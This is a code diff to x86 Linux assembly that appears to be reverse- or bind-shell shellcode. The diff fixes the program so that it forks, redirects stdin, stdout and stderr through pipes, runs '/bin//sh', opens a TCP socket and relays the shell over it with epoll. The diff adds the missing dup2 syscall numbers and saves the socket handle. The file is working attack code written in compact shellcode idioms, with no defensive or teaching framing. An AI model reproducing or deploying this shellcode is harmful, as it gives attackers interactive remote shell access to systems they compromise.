@@ -28,28 +28,35 @@
 ;  POSSIBILITY OF SUCH DAMAGE.
 ;  
 
-%define SYS_pipe           0x02A
+%define SYS_exit           0x001
 %define SYS_fork           0x002 
-%define SYS_close          0x006
-%define SYS_execve         0x00B
-%define SYS_epoll_create1  0x149 
-%define SYS_epoll_ctl      0x0FF
-%define SYS_epoll_wait     0x100
 %define SYS_read           0x003
 %define SYS_write          0x004
-%define SYS_kill           0x025 
+%define SYS_close          0x006
+%define SYS_execve         0x00B
+%define SYS_kill           0x025
+%define SYS_pipe           0x02A
+%define SYS_dup2           0x03f
+%define SYS_socketcall     0x066
+%define SYS_epoll_ctl      0x0FF
+%define SYS_epoll_wait     0x100
+%define SYS_epoll_create1  0x149
 %define SYS_shutdown       0x175
-%define SYS_exit           0x001
+
 
 %define STDIN_FILENO    0
 %define STDOUT_FILENO   1
 %define STDERR_FILENO   2
 
-%define EPOLLIN 0x001
+%define EPOLLIN     0x001
 
 %define EPOLL_CTL_ADD 1
 %define EPOLL_CTL_DEL 2
 %define EPOLL_CTL_MOD 3
+
+%define SYS_SOCKET      1
+%define SYS_BIND        2  
+%define SYS_CONNECT     3 
 
 %define SIGCHLD	20
 %define BUFSIZ 256
@@ -101,32 +108,42 @@ start:
       ; dup2(p.in[0], STDIN_FILENO);
       mov    ecx, STDIN_FILENO
       mov    ebx, [ebp+p_in]
+      mov    eax, SYS_dup2
       int    0x80    
+      
       ; dup2(p.out[1], STDOUT_FILENO);
       mov    ecx, STDOUT_FILENO    
       mov    ebx, [ebp+p_out+4]
+      mov    eax, SYS_dup2      
       int    0x80      
+      
       ; dup2(p.out[1], STDERR_FILENO);
       mov    ecx, STDERR_FILENO    
       mov    ebx, [ebp+p_out+4]
+      mov    eax, SYS_dup2      
       int    0x80     
+      
       ; close(p.in[0]);
       mov    eax, SYS_close
       mov    ebx, [ebp+p_in]    
-      int    0x80    
+      int    0x80   
+      
       ; close(p.in[1]);
       mov    eax, SYS_close  
       mov    ebx, [ebp+p_in+4]    
       int    0x80    
+
       ; close(p.out[0]);
       mov    eax, SYS_close 
       mov    ebx, [ebp+p_out]    
       int    0x80    
+
       ; close(p.out[1]);    
       mov    eax, SYS_close
       mov    ebx, [ebp+p_out+4]    
       int    0x80       
-      
+
+      ; execve("/bin//sh", 0, 0);
       mov    eax, SYS_execve
       cdq
       xor    ecx, ecx
@@ -140,6 +157,7 @@ connect:
       mov    eax, SYS_close
       mov    ebx, [ebp+p_in]    
       int    0x80    
+
       ; close(p.out[1]);
       mov    eax, SYS_close  
       mov    ebx, [ebp+p_out+4]    
@@ -148,13 +166,14 @@ connect:
       ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP);    
       xor    ebx, ebx          ; ebx=0
       mul    ebx               ; eax=0, edx=0
-      mov    al, 0x66          ; eax      = sys_socketcall
+      mov    al, SYS_socketcall
       inc    ebx               ; ebx      = sys_socket
       push   edx               ; protocol = IPPROTO_IP
       push   ebx               ; type     = SOCK_STREAM
       push   2                 ; family   = AF_INET
       mov    ecx, esp          ; ecx      = &args
       int    0x80
+      mov    [ebp+s], eax
 
       ; efd = epoll_create1(0);
       mov    eax, SYS_epoll_create1
@@ -172,6 +191,7 @@ poll_init:
       mov    edx, [ebp+s]
       lea    esi, [ebp+evt]
       int    0x80 
+
       ; epoll_ctl(efd, EPOLL_CTL_ADD, h[i], &evts[0]);      
       mov    eax, SYS_epoll_ctl
       mov    ebx, [ebp+efd]
@@ -237,6 +257,7 @@ close_efd:
       mov    edx, [ebp+h]
       xor    esi, esi
       int    0x80  
+
       ; epoll_ctl(efd, EPOLL_CTL_DEL, h[i], NULL);      
       mov    eax, SYS_epoll_ctl
       mov    ebx, [ebp+efd]
@@ -250,11 +271,13 @@ shutdown:
       mov    ebx, [ebp+pid]
       mov    ecx, SIGCHLD
       int    0x80
+
       ; shutdown(s, SHUT_RDWR);
       mov    eax, SYS_shutdown
       mov    ebx, [ebp+s]
       mov    ecx, SHUT_RDWR
       int    0x80
+
       ; close(s);
       mov    eax, SYS_close
       mov    ebx, [ebp+s]
@@ -264,6 +287,7 @@ close_pipes:
       mov    ebx, [ebp+p_in+4]
       mov    eax, SYS_close
       int    0x80
+
       ; close(out[0]);    
       mov    ebx, [ebp+p_out]
       mov    eax, SYS_close
@@ -276,3 +300,4 @@ exit:
       add    esp, sc_prop_size
       popad
       ret    
+      
